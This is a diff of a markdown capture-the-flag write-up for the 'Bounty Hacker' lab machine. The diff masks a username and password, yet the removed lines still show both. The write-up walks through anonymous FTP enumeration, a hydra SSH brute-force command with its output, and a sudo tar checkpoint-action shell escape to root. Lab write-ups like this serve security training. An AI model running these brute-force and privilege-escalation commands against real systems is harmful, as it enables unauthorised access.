@@ -78,15 +78,12 @@ ftp> ls -l
 ```
 
 - **`locks.txt`**: Possibly a list of passwords.
-- **`task.txt`**: Contained tasks and revealed the username "lin".
+- **`task.txt`**: Contained tasks and revealed the username "***".
     
     ```yaml
     ┌──(root㉿kali)-[bounty-hacker]
-    └─# cat task.txt                                                                                                                          
-    1.) Protect Vicious.
-    2.) Plan for Red Eye pickup on the moon.
-    
-    -lin
+    └─# cat task.
+    ...    
     ```
     
 
@@ -108,11 +105,11 @@ Finished
 
 ### 4. SSH Brute Force:
 
-Using **`hydra`**, we performed a brute force attack on the SSH service with the username "lin" and the password list from **`locks.txt`**. This successfully revealed the password for "lin" as **`RedDr4gonSynd1cat3`**.
+Using **`hydra`**, we performed a brute force attack on the SSH service with the username "***" and the password list from **`locks.txt`**. This successfully revealed the password for `***` as **`***`**.
 
 ```yaml
 ┌──(root㉿kali)-[bounty-hacker]
-└─# hydra -l lin -P locks.txt 10.10.207.64 ssh -t 16                                                                                     
+└─# hydra -l *** -P locks.txt 10.10.207.64 ssh -t 16                                                                                     
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-28 21:04:11
@@ -120,29 +117,29 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-28 21:04:
 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
 [DATA] attacking ssh://10.10.207.64:22/
-[22][ssh] host: 10.10.207.64   login: lin   password: RedDr4gonSynd1cat3
+[22][ssh] host: 10.10.207.64   login: ***   password: ...
 ```
 
 ```yaml
 ┌──(root㉿kali)-[bounty-hacker]
-└─# ssh lin@10.10.207.64
-lin@10.10.207.64's password: 
+└─# ssh ***@10.10.207.64
+***@10.10.207.64's password: 
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 ```
 
 ### 5. Privilege Escalation:
 
 ```yaml
-lin@bountyhacker:~/Desktop$ sudo -l
-[sudo] password for lin: 
-Matching Defaults entries for lin on bountyhacker:
+***@bountyhacker:~/Desktop$ sudo -l
+[sudo] password for ***: 
+Matching Defaults entries for *** on bountyhacker:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User lin may run the following commands on bountyhacker:
+User may run the following commands on bountyhacker:
     (root) /bin/tar
 ```
 
-After gaining SSH access, we found that user "lin" can run **`/bin/tar`** as root without a password, as revealed by **`sudo -l`**. By leveraging this, we executed **`tar`** with the **`--checkpoint-action=exec`** option to spawn a shell with root privileges.
+After gaining SSH access, we found that user "***" can run **`/bin/tar`** as root without a password, as revealed by **`sudo -l`**. By leveraging this, we executed **`tar`** with the **`--checkpoint-action=exec`** option to spawn a shell with root privileges.
 
 ```yaml
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
@@ -159,7 +156,7 @@ root
 The system "bounty-hacker" had multiple vulnerabilities:
 
 1. Anonymous FTP access that revealed potential usernames and password lists.
-2. Weak password for the SSH user "lin".
+2. Weak password for the SSH user "***".
 3. Misconfigured sudo permissions allowing the execution of **`tar`** as root.
 
 Successfully exploiting these vulnerabilities allowed us to escalate privileges and obtain root access to the target system.
